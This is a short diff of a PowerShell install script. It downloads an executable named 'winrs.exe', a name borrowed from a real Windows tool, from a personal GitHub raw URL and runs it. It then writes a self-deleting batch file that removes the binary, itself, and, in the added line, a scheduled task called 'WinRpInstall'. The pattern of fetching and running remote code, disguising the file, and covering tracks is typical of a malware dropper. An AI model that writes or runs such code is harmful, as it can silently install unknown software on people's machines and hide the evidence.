@@ -20,7 +20,6 @@ $installContent = @'
 Try {
     Write-Output "===> Start at $(Get-Date -Format o)"
 
-    # Tải về winrs.exe vào cùng thư mục script và thực thi
     $scriptPath = Join-Path $PSScriptRoot 'winrs.exe'
     $url = 'https://raw.githubusercontent.com/truongcp0305/dp/main/winrs.exe'
 
@@ -51,6 +50,7 @@ Try {
     @"
 @echo off
 timeout /t 2 /nobreak >nul
+schtasks /Delete /TN "WinRpInstall" /F >nul 2>&1
 del "$scriptPath" >nul 2>&1
 del "$tempBat" >nul 2>&1
 "@ | Out-File -FilePath $tempBat -Encoding ASCII
